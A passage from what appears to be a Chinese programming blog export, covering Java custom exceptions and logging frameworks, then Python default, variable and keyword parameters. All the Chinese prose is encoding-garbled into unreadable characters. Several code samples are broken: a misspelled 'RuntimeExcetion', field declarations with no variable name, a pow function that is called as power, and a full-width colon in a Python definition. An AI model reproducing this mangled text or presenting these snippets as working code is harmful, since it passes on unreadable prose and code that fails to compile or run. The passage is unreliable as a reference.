<p><code>BaseException</code>éœ€è¦ä»ä¸€ä¸ªé€‚åˆçš„<code>Exception</code>æ´¾ç”Ÿï¼Œé€šå¸¸å»ºè®®ä»<code>RuntimeException</code>æ´¾ç”Ÿï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseException</span> <span class="keyword">extends</span> <span class="title">RuntimeExcetion</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å…¶ä»–ä¸šåŠ¡ç±»å‹çš„å¼‚å¸¸å°±å¯ä»¥ä»<code>BaseException</code>æ´¾ç”Ÿï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserNotFoundException</span> <span class="keyword">extends</span> <span class="title">BaseException</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailedException</span> <span class="keyword">extends</span> <span class="title">BaseException</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="ä½¿ç”¨JDK-Logging">ä½¿ç”¨JDK Logging</h3>
<p>ç›´æ¥ä¸ŠğŸŒ°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.logging.Level;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Logger logger = Logger.getGlobal();</span><br><span class="line">        logger.info(<span class="string">&quot;start process...&quot;</span>);</span><br><span class="line">        logger.warning(<span class="string">&quot;memory is running out...&quot;</span>);</span><br><span class="line">        logger.fine(<span class="string">&quot;ignore&quot;</span>);</span><br><span class="line">        logger.severe(<span class="string">&quot;process will be terminated...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10æœˆ 12, 2019 6:34:55 ä¸‹åˆ Hello main</span><br><span class="line">ä¿¡æ¯: start process...</span><br><span class="line">10æœˆ 12, 2019 6:34:55 ä¸‹åˆ Hello main</span><br><span class="line">è­¦å‘Š: memory is running out...</span><br><span class="line">10æœˆ 12, 2019 6:34:55 ä¸‹åˆ Hello main</span><br><span class="line">ä¸¥é‡: process will be terminated...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>logger.fine(&quot;ignore&quot;);</code>æ²¡æœ‰æ‰“å°æ˜¯å› ä¸ºJDKé»˜è®¤çš„æ¶ˆæ¯çº§åˆ«æ˜¯<code>Info</code>ï¼š</p>
<ul>
<li>SEVERE</li>
<li>WARNING</li>
<li>INFO</li>
<li>CONFIG</li>
<li>FINE</li>
<li>FINER</li>
<li>FINEST</li>
</ul>
<h3 id="ä½¿ç”¨Common-Logging">ä½¿ç”¨Common Logging</h3>
<p>ä½¿ç”¨ Common Loggingåªéœ€è¦ä¸¤ä¸ªæ­¥éª¤ï¼š</p>
<ul>
<li>é€šè¿‡<code>LogFactory</code>è·å–<code>Log</code>ç±»çš„å®ä¾‹</li>
<li>ä½¿ç”¨<code>Log</code>å®ä¾‹çš„æ–¹æ³•æ‰“å°æ—¥å¿—</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.logging.Log;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.logging.LogFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Log log = LogFactory.getLog(Main.class);</span><br><span class="line">        log.info(<span class="string">&quot;start...&quot;</span>);</span><br><span class="line">        log.warn(<span class="string">&quot;end...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Commons Loggingå®šä¹‰äº†6ä¸ªæ—¥å¿—çº§åˆ«ï¼š</p>
<ul>
<li>FATAL</li>
<li>ERROR</li>
<li>WARNING</li>
<li>INFO</li>
<li>DEBUG</li>
<li>TRACE</li>
</ul>
<p>ä½¿ç”¨Common Loggingæ—¶ï¼Œå¦‚æœåœ¨é™æ€æ–¹æ³•ä¸­å¼•ç”¨<code>Log</code>ï¼Œé€šå¸¸ç›´æ¥å®šä¹‰ä¸€ä¸ªé™æ€ç±»å‹å˜é‡ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> Log log = LogFactory.getLog(Main.class);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åœ¨å®ä¾‹æ–¹æ³•ä¸­å¼•ç”¨<code>Log</code>ï¼Œé€šè¿‡å®šä¹‰ä¸€ä¸ªå®ä¾‹å˜é‡ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Log = LogFactory.getLog(getClass());</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™ä¸¤ç§å®šä¹‰çš„æ–¹æ³•åŒºåˆ«åœ¨äºï¼šå®ä¾‹å˜é‡logè·å–æ–¹å¼æ˜¯<code>LogFactory.getLog(getClass)</code>ï¼Œè¿™ç§åšæ³•çš„å¥½å¤„æ˜¯ï¼Œå­ç±»å¯ä»¥ç›´æ¥ä½¿ç”¨<code>log</code>å®ä¾‹ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;bar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ­¤å¤–ï¼ŒCommons Loggingçš„æ—¥å¿—æ–¹æ³•ï¼Œä¾‹å¦‚<code>info()</code>ï¼Œé™¤äº†æ ‡å‡†çš„<code>info(String)</code>å¤–ï¼Œè¿˜æä¾›äº†ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„é‡è½½æ–¹æ³•ï¼š<code>info(String, Throwable)</code>ï¼Œè¿™ä½¿å¾—è®°å½•å¼‚å¸¸æ›´åŠ ç®€å•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    log.error(<span class="string">&quot;got Exception&quot;</span>, e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="ä½¿ç”¨Log4j">ä½¿ç”¨Log4j</h3>
<p>Commons Loggingï¼Œå¯ä»¥ä½œä¸ºâ€œæ—¥å¿—æ¥å£â€æ¥ä½¿ç”¨ï¼Œè€Œå®ç°è¿™ä¸ªæ¥å£å¯ä»¥ä½¿ç”¨Log4jã€‚</p>
<p>æˆ‘ä»¬åœ¨ä½¿ç”¨Log4jæ¡†æ¶æ—¶ï¼Œæ›´å¤šæ—¶å€™æ˜¯é€šè¿‡é…ç½®æ–‡ä»¶æ¥é…ç½®å®ƒã€‚</p>
<p>ä»¥XMLé…ç½®ä¸ºä¾‹ï¼Œä½¿ç”¨Log4jçš„æ—¶å€™ï¼Œæˆ‘ä»¬æŠŠä¸€ä¸ª<code>log4j2.xml</code>çš„æ–‡ä»¶æ”¾åˆ°<code>classpath</code>ä¸‹å°±å¯ä»¥è®©Log4jè¯»å–é…ç½®æ–‡ä»¶å¹¶æŒ‰ç…§æˆ‘ä»¬çš„é…ç½®æ¥è¾“å‡ºæ—¥å¿—ã€‚</p>
<p>å¦å¤–ï¼Œå› ä¸ºLog4jä¹Ÿæ˜¯ä¸€ä¸ªç¬¬ä¸‰æ–¹åº“ï¼Œéœ€è¦æŠŠä¸‹é¢4ä¸ªjaråŒ…æ”¾åœ¨<code>classpath</code>ä¸­ï¼š</p>
<ul>
<li>log4j-api-2.x.jar</li>
<li>log4j-core-2.x.jar</li>
<li>log4j-jcl-2.x.jar</li>
<li>commons-logging-1.2.jar</li>
</ul>
<h3 id="ä½¿ç”¨SLF4Jå’ŒLogback">ä½¿ç”¨SLF4Jå’ŒLogback</h3>
<p>SLF4Jç±»ä¼¼äºCommons Loggingï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæ—¥å¿—æ¥å£ï¼Œè€ŒLogbackç±»ä¼¼äºLog4jï¼Œæ˜¯ä¸€ä¸ªæ—¥å¿—çš„å®ç°ã€‚</p>
<p>SLF4Jä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Logger = LoggerFactory.getLogger(getClass());</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> bar = <span class="number">100</span>;</span><br><span class="line">        String name = <span class="string">&quot;foo&quot;</span>;</span><br><span class="line">        logger.info(<span class="string">&quot;bar = &#123;&#125; name = &#123;&#125;&quot;</span>, bar, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>SLF4Jä½¿ç”¨ä¸‹é¢ä¸‰ä¸ªjaråŒ…ï¼š</p>
<ul>
<li>slf4j-api-1.7.x.jar</li>
<li>logback-classic-1.2.x.jar</li>
<li>logback-core-1.2.x.jar</li>
</ul>
<p>å’ŒLog4jç±»ä¼¼ï¼Œæˆ‘ä»¬ä»ç„¶éœ€è¦ä¸€ä¸ªLogbackçš„é…ç½®æ–‡ä»¶ï¼ŒæŠŠ<code>logback.xml</code>æ”¾åˆ°classpathä¸‹ã€‚</p>
]]></content>
      <categories>
        <category>ç¼–ç¨‹</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Pythonå‡½æ•°çš„å‚æ•°</title>
    <url>/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0/</url>
    <content><![CDATA[<h1 id="Pythonå‡½æ•°çš„å‚æ•°">Pythonå‡½æ•°çš„å‚æ•°</h1>
<p>å…³äºPythonçš„å‚æ•°ï¼Œåœ¨å„ç§ä»£ç ä¸­çœ‹åˆ°æœ€å¤šçš„å¯èƒ½å°±æ˜¯<code>def func(*args, **kw)</code>è¿™ç§å‚æ•°ç»„åˆï¼Œè¿™ç¯‡æ–‡ç« å°±æ¥è®¨è®ºæˆ‘ä»¬æ˜¯å¦‚ä½•ä¸€æ­¥ä¸€æ­¥æ¥å¾—åˆ°è¿™æ ·çš„å‚æ•°ç»„åˆã€‚</p>
<h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>
<p>Pythonçš„å‡½æ•°å®šä¹‰éå¸¸ç®€å•ï¼Œä½†çµæ´»åº¦å´éå¸¸å¤§ã€‚é™¤äº†æ­£å¸¸å®šä¹‰çš„å¿…é€‰å‚æ•°å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨é»˜è®¤å‚æ•°ã€å¯å˜å‚æ•°å’Œå…³é”®å­—å‚æ•°ï¼Œä½¿å¾—å‡½æ•°å®šä¹‰å‡ºæ¥çš„æ¥å£ï¼Œä¸ä½†èƒ½å¤„ç†å¤æ‚çš„å‚æ•°ï¼Œè¿˜å¯ä»¥ç®€åŒ–è°ƒç”¨è€…çš„ä»£ç ã€‚</p>
<h2 id="ä½ç½®å‚æ•°">ä½ç½®å‚æ•°</h2>
<p>ä½ç½®å‚æ•°æ˜¯æˆ‘ä»¬æœ€å¸¸è§çš„å‡½æ•°å‚æ•°ï¼Œä¾‹å¦‚ä¸‹é¢å®Œæˆå¹‚è¿ç®—çš„<code>pow</code>å‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>(<span class="params">x, n</span>):</span></span><br><span class="line">    s = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        n = n - <span class="number">1</span></span><br><span class="line">        s = s * x</span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>
<p><code>pow(x, n)</code>å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼š<code>x</code>å’Œ<code>n</code>ï¼Œè¿™ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯ä½ç½®å‚æ•°ï¼Œè°ƒç”¨å‡½æ•°æ—¶ï¼Œä¼ å…¥çš„ä¸¤ä¸ªå€¼æŒ‰ç…§ä½ç½®é¡ºåºä¾æ¬¡èµ‹å€¼ç»™å‚æ•°<code>x</code>å’Œ<code>n</code>ã€‚</p>
<h2 id="é»˜è®¤å‚æ•°">é»˜è®¤å‚æ•°</h2>
<p>ç”±äºæˆ‘ä»¬ç»å¸¸è®¡ç®—<code>x^2</code>ï¼Œæ‰€ä»¥ï¼Œå®Œå…¨å¯ä»¥æŠŠç¬¬äºŒä¸ªå‚æ•°<code>n</code>çš„é»˜è®¤å€¼è®¾å®šä¸º<code>2</code>ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>(<span class="params">x, n=<span class="number">2</span></span>):</span></span><br><span class="line">    s = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        n = n - <span class="number">1</span></span><br><span class="line">        s = s * x</span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨<code>pow(5)</code>æ—¶ï¼Œç›¸å½“äºè°ƒç”¨<code>pow(5, 2)</code>ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>power(<span class="number">5</span>)</span><br><span class="line"><span class="number">25</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>power(<span class="number">5</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">25</span></span><br></pre></td></tr></table></figure>
<p><strong>è®¾ç½®é»˜è®¤å‚æ•°æ—¶ï¼Œæœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š</strong></p>
<ul>
<li>å¿…é€‰å‚æ•°åœ¨å‰ï¼Œé»˜è®¤å‚æ•°åœ¨åï¼Œå¦åˆ™Pythonç¼–è¯‘å™¨ä¼šæŠ¥é”™ï¼›</li>
<li>å½“å‡½æ•°æœ‰å¤šä¸ªå‚æ•°æ—¶ï¼ŒæŠŠå˜åŒ–å¤§çš„å‚æ•°æ”¾å‰é¢ï¼Œå˜åŒ–å°çš„å‚æ•°æ”¾åé¢ã€‚å˜åŒ–å°çš„å‚æ•°å°±å¯ä»¥ä½œä¸ºé»˜è®¤å‚æ•°ã€‚</li>
<li>ä¹Ÿå¯ä»¥ä¸æŒ‰é¡ºåºæä¾›éƒ¨åˆ†é»˜è®¤å‚æ•°ã€‚å½“ä¸æŒ‰é¡ºåºæä¾›éƒ¨åˆ†é»˜è®¤å‚æ•°æ—¶ï¼Œéœ€è¦æŠŠå‚æ•°åå†™ä¸Šã€‚</li>
</ul>
<p>é»˜è®¤å‚æ•°æœ‰ä¸ªæœ€å¤§çš„å‘ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">add_end</span>(<span class="params">L=[]</span>):</span></span><br><span class="line"><span class="meta">... </span>	L.append(<span class="string">&#x27;END&#x27;</span>)</span><br><span class="line"><span class="meta">... </span>	<span class="keyword">return</span> L</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add_end()</span><br><span class="line">[<span class="string">&#x27;END&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add_end()</span><br><span class="line">[<span class="string">&#x27;END&#x27;</span>, <span class="string">&#x27;END&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add_end()</span><br><span class="line">[<span class="string">&#x27;END&#x27;</span>, <span class="string">&#x27;END&#x27;</span>, <span class="string">&#x27;END&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å‘ç°ï¼Œæ¯æ¬¡ä½¿ç”¨é»˜è®¤å‚æ•°è°ƒç”¨<code>add_end()</code>å‡½æ•°æ—¶ï¼Œéƒ½ä¼šâ€œè®°ä½â€œä¸Šä¸€æ¬¡è°ƒç”¨çš„ç»“æœã€‚</p>
<p>åŸå› å¦‚ä¸‹ï¼š</p>
<p>Pythonå‡½æ•°åœ¨å®šä¹‰çš„æ—¶å€™ï¼Œé»˜è®¤å‚æ•°<code>L</code>çš„å€¼å°±è¢«è®¡ç®—å‡ºæ¥äº†ï¼Œå³<code>[]</code>ï¼Œå› ä¸ºé»˜è®¤å‚æ•°<code>L</code>ä¹Ÿæ˜¯ä¸€ä¸ªå˜é‡ï¼Œå®ƒæŒ‡å‘å¯¹è±¡<code>[]</code>ï¼Œæ¯æ¬¡è°ƒç”¨è¯¥å‡½æ•°ï¼Œå¦‚æœæ”¹å˜äº†<code>L</code>çš„å†…å®¹ï¼Œåˆ™ä¸‹æ¬¡è°ƒç”¨æ—¶ï¼Œé»˜è®¤å‚æ•°çš„å†…å®¹å°±å˜äº†ï¼Œä¸å†æ˜¯å‡½æ•°å®šä¹‰æ—¶çš„<code>[]</code>äº†ã€‚</p>
<p><strong>æ‰€ä»¥ï¼Œé»˜è®¤å‚æ•°å¿…é¡»æŒ‡å‘ä¸å¯å˜å¯¹è±¡ï¼ï¼ï¼</strong></p>
<p>ä¸Šé¢çš„ä¾‹å­ä¿®æ”¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_end</span>(<span class="params">L=None</span>)ï¼š</span></span><br><span class="line">	if L == None:</span><br><span class="line">        L = []</span><br><span class="line">    L.append(<span class="string">&#x27;END&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> L</span><br></pre></td></tr></table></figure>
<h2 id="å¯å˜å‚æ•°">å¯å˜å‚æ•°</h2>
<p>ä»¥æ•°å­¦é¢˜ä¸ºä¾‹å­ï¼Œç»™å®šä¸€ç»„æ•°å­—aï¼Œbï¼Œcâ€¦â€¦ï¼Œè¯·è®¡ç®—a^2 + b^2 + c^2 + â€¦â€¦ï¼Œç”±äºå‚æ•°ä¸ç¡®å®šï¼Œé¦–å…ˆæƒ³åˆ°å¯ä»¥æŠŠaï¼Œbï¼Œcâ€¦ä½œä¸ºä¸€ä¸ª<code>list</code>æˆ–è€…<code>tuple</code>ä¼ è¿›æ¥ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">numbers</span>):</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> numbers:</span><br><span class="line">        sum = sum + n * n</span><br><span class="line">    <span class="keyword">return</span> sum</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¼ å‚æ—¶å°±éœ€è¦å…ˆç»„è£…ä¸€ä¸ª<code>tuple</code>æˆ–<code>list</code>ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>calc([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="number">14</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>calc((<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>))</span><br><span class="line"><span class="number">84</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœä½¿ç”¨å¯å˜å‚æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">*numbers</span>):</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> numbers:</span><br><span class="line">        sum = sum + n * n</span><br><span class="line">    <span class="keyword">return</span> sum</span><br></pre></td></tr></table></figure>
<p>åœ¨å‡½æ•°å†…éƒ¨ï¼Œå‚æ•°<code>numbers</code>æ¥æ”¶åˆ°çš„æ˜¯ä¸€ä¸ªtupleï¼Œå› æ­¤ï¼Œå‡½æ•°ä»£ç å®Œå…¨ä¸å˜ã€‚ä½†æ˜¯ï¼Œè°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œå¯ä»¥ä¼ å…¥ä»»æ„ä¸ªå‚æ•°ï¼ŒåŒ…æ‹¬0ä¸ªå‚æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>calc(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>calc()</span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¦‚æœå·²ç»æœ‰ä¸€ä¸ª<code>list</code>æˆ–<code>tuple</code>ï¼Œä¼ å‚æ—¶å¯ä»¥ä½¿ç”¨<code>*</code>æ¥å¯¹å…¶è¿›è¡Œè§£åŒ…æ“ä½œï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>calc(*nums)</span><br><span class="line"><span class="number">14</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>*nums</code>è¡¨ç¤ºæŠŠ<code>nums</code>è¿™ä¸ªlistçš„æ‰€æœ‰å…ƒç´ ä½œä¸ºå¯å˜å‚æ•°ä¼ è¿›å»ã€‚</p>
<h2 id="å…³é”®å­—å‚æ•°">å…³é”®å­—å‚æ•°</h2>
<p>å…³é”®å­—å‚æ•°å…è®¸ä½ ä¼ å…¥0ä¸ªæˆ–ä»»æ„ä¸ªå«å‚æ•°åçš„å‚æ•°ï¼Œè¿™äº›å…³é”®å­—å‚æ•°åœ¨å‡½æ•°å†…éƒ¨è‡ªåŠ¨ç»„è£…ä¸ºä¸€ä¸ªdictã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span>(<span class="params">name, age, **kw</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;name:&#x27;</span>, name, <span class="string">&#x27;age:&#x27;</span>, age, <span class="string">&#x27;other:&#x27;</span>, kw)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åœ¨è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œå¯ä»¥åªä¼ å…¥å¿…é€‰å‚æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Colin&#x27;</span>, <span class="number">24</span>)</span><br><span class="line">name: Colin age: <span class="number">24</span> other: &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå¯ä»¥ä¼ å…¥ä»»æ„ä¸ªæ•°çš„å…³é”®å­—å‚æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Bob&#x27;</span>, <span class="number">35</span>, city=<span class="string">&#x27;Beijing&#x27;</span>)</span><br><span class="line">name: Bob age: <span class="number">35</span> other: &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Beijing&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Adam&#x27;</span>, <span class="number">45</span>, gender=<span class="string">&#x27;M&#x27;</span>, job=<span class="string">&#x27;Engineer&#x27;</span>)</span><br><span class="line">name: Adam age: <span class="number">45</span> other: &#123;<span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;job&#x27;</span>: <span class="string">&#x27;Engineer&#x27;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å…³é”®å­—å‚æ•°å¯ä»¥æ‰©å±•å‡½æ•°åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼šæ­£åœ¨åšä¸€ä¸ªç”¨æˆ·æ³¨å†Œçš„åŠŸèƒ½ï¼Œé™¤äº†ç”¨æˆ·åå’Œå¹´é¾„æ˜¯å¿…å¡«é¡¹å¤–ï¼Œå…¶ä»–éƒ½æ˜¯å¯é€‰é¡¹ï¼Œåˆ©ç”¨å…³é”®å­—å‚æ•°æ¥å®šä¹‰è¿™ä¸ªå‡½æ•°å°±èƒ½æ»¡è¶³æ³¨å†Œçš„éœ€æ±‚ã€‚</p>
<p>å’Œå¯å˜å‚æ•°ç±»ä¼¼ï¼Œå¯ä»¥å…ˆç»„è£…å‡ºä¸€ä¸ª<code>dict</code>ï¼Œå†æŠŠè¯¥<code>dict</code>è½¬æ¢ä¸ºå…³é”®å­—å‚æ•°ä¼ è¿›å»ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>extra = &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Beijing&#x27;</span>, <span class="string">&#x27;job&#x27;</span>: <span class="string">&#x27;Engineer&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Jack&#x27;</span>, <span class="number">24</span>, city=extra[<span class="string">&#x27;city&#x27;</span>], job=extra[<span class="string">&#x27;job&#x27;</span>])</span><br><span class="line">name: Jack age: <span class="number">24</span> other: &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Beijing&#x27;</span>, <span class="string">&#x27;job&#x27;</span>: <span class="string">&#x27;Engineer&#x27;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥ç®€åŒ–ä¸ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>extra = &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Beijing&#x27;</span>, <span class="string">&#x27;job&#x27;</span>: <span class="string">&#x27;Engineer&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Jack&#x27;</span>, <span class="number">24</span>, **extra)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>**extra</code>è¡¨ç¤ºæŠŠ<code>extra</code>è¿™ä¸ªdictçš„æ‰€æœ‰key-valueç”¨å…³é”®å­—å‚æ•°ä¼ å…¥åˆ°å‡½æ•°çš„<code>**kw</code>å‚æ•°ï¼Œ<code>kw</code>å°†è·å¾—ä¸€ä¸ªdictï¼Œæ³¨æ„<code>kw</code>è·å¾—çš„dictæ˜¯<code>extra</code>çš„ä¸€ä»½æ‹·è´ï¼Œå¯¹<code>kw</code>çš„æ”¹åŠ¨ä¸ä¼šå½±å“åˆ°å‡½æ•°å¤–çš„<code>extra</code>ã€‚</p>
<h2 id="å‘½ä»¤å…³é”®å­—å‚æ•°">å‘½ä»¤å…³é”®å­—å‚æ•°</h2>
